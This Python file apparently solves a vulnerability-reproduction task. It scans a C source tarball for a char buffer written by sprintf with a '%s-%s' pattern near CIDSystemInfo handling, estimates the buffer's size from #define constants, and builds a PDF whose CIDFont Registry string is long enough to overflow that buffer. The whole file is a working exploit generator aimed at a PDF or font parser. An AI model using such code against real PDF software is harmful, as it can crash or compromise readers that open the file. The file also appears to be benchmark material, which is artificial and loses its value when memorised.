import io
import os
import re
import tarfile
from typing import Dict, List, Optional, Tuple


class Solution:
    def _extract_defines(self, tf: tarfile.TarFile) -> Dict[str, int]:
        defines: Dict[str, int] = {}
        define_re = re.compile(r'^\s*#\s*define\s+([A-Za-z_]\w*)\s+(\d+)\b', re.MULTILINE)
        for m in tf.getmembers():
            if not m.isfile():
                continue
            name = m.name.lower()
            if not (name.endswith((".h", ".hh", ".hpp", ".c", ".cc", ".cpp"))):
                continue
            if m.size <= 0 or m.size > 5 * 1024 * 1024:
                continue
            f = tf.extractfile(m)
            if f is None:
                continue
            try:
                data = f.read()
            finally:
                f.close()
            if b"#define" not in data:
                continue
            txt = data.decode("utf-8", "ignore")
            for mm in define_re.finditer(txt):
                k = mm.group(1)
                v = int(mm.group(2))
                if k not in defines:
                    defines[k] = v
        return defines

    def _find_bufsize(self, src_path: str) -> Optional[int]:
        try:
            tf = tarfile.open(src_path, "r:*")
        except Exception:
            return None

        try:
            defines = self._extract_defines(tf)

            sprintf_re = re.compile(
                r'\b(?:s?printf|vsprintf)\s*\(\s*([A-Za-z_]\w*)\s*,\s*"[^"]*%s-%s[^"]*"',
                re.MULTILINE,
            )
            decl_re_template = r'\bchar\s+{var}\s*\[\s*([A-Za-z_]\w*|\d+)\s*\]'
            candidates: List[Tuple[int, int, str]] = []

            for m in tf.getmembers():
                if not m.isfile():
                    continue
                lname = m.name.lower()
                if not (lname.endswith((".c", ".cc", ".cpp", ".h", ".hh", ".hpp"))):
                    continue
                if m.size <= 0 or m.size > 6 * 1024 * 1024:
                    continue
                f = tf.extractfile(m)
                if f is None:
                    continue
                try:
                    data = f.read()
                finally:
                    f.close()

                if b"%s-%s" not in data:
                    continue

                txt = data.decode("utf-8", "ignore")
                if "%s-%s" not in txt:
                    continue

                for mm in sprintf_re.finditer(txt):
                    var = mm.group(1)
                    start = mm.start()
                    before_start = max(0, start - 4000)
                    before = txt[before_start:start]
                    after = txt[start:min(len(txt), start + 400)]

                    decl_re = re.compile(decl_re_template.format(var=re.escape(var)))
                    dim_token = None
                    for dm in decl_re.finditer(before):
                        dim_token = dm.group(1)

                    if dim_token is None:
                        continue

                    if dim_token.isdigit():
                        size = int(dim_token)
                    else:
                        size = defines.get(dim_token)
                        if size is None:
                            continue

                    if size <= 0 or size > 2_000_000:
                        continue

                    snippet = (before[-1500:] + after).lower()
                    rel = 0
                    if "cidsysteminfo" in snippet:
                        rel += 4
                    if "registry" in snippet:
                        rel += 3
                    if "ordering" in snippet:
                        rel += 3
                    vlow = var.lower()
                    if any(k in vlow for k in ("ros", "cid", "coll", "collect", "fallback", "name", "buf", "tmp")):
                        rel += 2
                    if any(k in lname for k in ("cid", "font", "pdf", "cmap", "ps", "type0")):
                        rel += 2

                    candidates.append((rel, size, m.name))

            if not candidates:
                return None

            max_rel = max(r for r, _, _ in candidates)
            best_sizes = [s for r, s, _ in candidates if r == max_rel]
            if not best_sizes:
                return None
            return max(best_sizes)
        finally:
            try:
                tf.close()
            except Exception:
                pass

    def _build_pdf(self, registry_len: int, ordering_len: int) -> bytes:
        reg = b"A" * registry_len
        ordv = b"B" * ordering_len

        header = b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n"

        objs: List[Tuple[int, bytes]] = []

        objs.append((1, b"<< /Type /Catalog /Pages 2 0 R >>\n"))
        objs.append((2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>\n"))

        # Page
        objs.append(
            (
                3,
                b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
                b"/Resources << /Font << /F1 5 0 R >> >> /Contents 4 0 R >>\n",
            )
        )

        stream_data = b"BT /F1 12 Tf 72 720 Td <0001> Tj ET\n"
        stream_obj = b"<< /Length " + str(len(stream_data)).encode("ascii") + b" >>\nstream\n" + stream_data + b"endstream\n"
        objs.append((4, stream_obj))

        objs.append(
            (
                5,
                b"<< /Type /Font /Subtype /Type0 /BaseFont /Foo /Encoding /Identity-H "
                b"/DescendantFonts [6 0 R] >>\n",
            )
        )

        cid_sys_info = b"<< /Registry (" + reg + b") /Ordering (" + ordv + b") /Supplement 0 >>"
        cidfont = (
            b"<< /Type /Font /Subtype /CIDFontType0 /BaseFont /Foo "
            b"/CIDSystemInfo "
            + cid_sys_info
            + b" /FontDescriptor 7 0 R /CIDToGIDMap /Identity /DW 1000 /W [0 [1000]] >>\n"
        )
        objs.append((6, cidfont))

        fontdesc = (
            b"<< /Type /FontDescriptor /FontName /Foo /Flags 4 "
            b"/FontBBox [0 0 0 0] /ItalicAngle 0 /Ascent 0 /Descent 0 "
            b"/CapHeight 0 /StemV 0 >>\n"
        )
        objs.append((7, fontdesc))

        buf = bytearray()
        buf.extend(header)
        offsets: Dict[int, int] = {}

        for objnum, content in objs:
            offsets[objnum] = len(buf)
            buf.extend(str(objnum).encode("ascii"))
            buf.extend(b" 0 obj\n")
            buf.extend(content)
            if not content.endswith(b"\n"):
                buf.extend(b"\n")
            buf.extend(b"endobj\n")

        xref_pos = len(buf)
        buf.extend(b"xref\n")
        size = 8
        buf.extend(b"0 " + str(size).encode("ascii") + b"\n")
        buf.extend(b"0000000000 65535 f \n")
        for i in range(1, size):
            off = offsets.get(i, 0)
            buf.extend(f"{off:010d} 00000 n \n".encode("ascii"))

        buf.extend(b"trailer\n")
        buf.extend(b"<< /Size 8 /Root 1 0 R >>\n")
        buf.extend(b"startxref\n")
        buf.extend(str(xref_pos).encode("ascii") + b"\n")
        buf.extend(b"%%EOF\n")
        return bytes(buf)

    def solve(self, src_path: str) -> bytes:
        bufsize = self._find_bufsize(src_path)

        if bufsize is None or bufsize <= 0:
            # Ground-truth-like safe oversize
            reg_len = 40000
            ord_len = 40000
        else:
            # Minimal overflow: registry alone can overflow many concat patterns; add short ordering.
            reg_len = max(1, bufsize)
            ord_len = 2

        return self._build_pdf(reg_len, ord_len)